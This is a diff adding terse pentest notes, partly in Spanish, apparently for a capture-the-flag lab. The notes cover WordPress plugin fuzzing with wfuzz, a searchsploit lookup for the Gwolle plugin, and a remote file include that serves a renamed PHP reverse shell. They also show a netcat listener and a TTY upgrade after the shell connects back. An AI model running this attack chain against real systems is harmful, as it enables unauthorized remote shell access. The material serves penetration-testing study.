@@ -1,0 +1,39 @@
+
+
+::: cd /opt/SecLists
+
+::: find \-name *wp*
+
+::: cd Discovery/Web-Content/CMS
+
+::: wfuzz -c -t 300 --hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
+
+::: searchsploit gwolle
+
+
+
+google.com:: monkey pentester php reverse shell
+        
+          download -->> php-reverse-shell-1.0.tar.gz
+
+
+::: tar -xf php-reverse-shell-1.0.tar.gz
+
+::: mv php-reverse-shell-1.0/php-reverse-shell.php .
+
+::: mv php-reverse-shell.php shell.php
+
+
+::: python -m SimpleHTTPServer 80
+
+::: nc -nlvp 443
+
+::: mv shell.php wp-load.php   ##!! por el servidor python sale un GET a un archivo wp-load.php, inyectamos el codigo malicioso cambiando el nombre del .php
+
+
+    $$$!!!! LA SHELL EN REVERSA SALE EN NETCAT (nc -nlvp 443)
+::: whoami
+::: script /dev/null -c bash
+            
+            configurar el tty desde ac]a
+
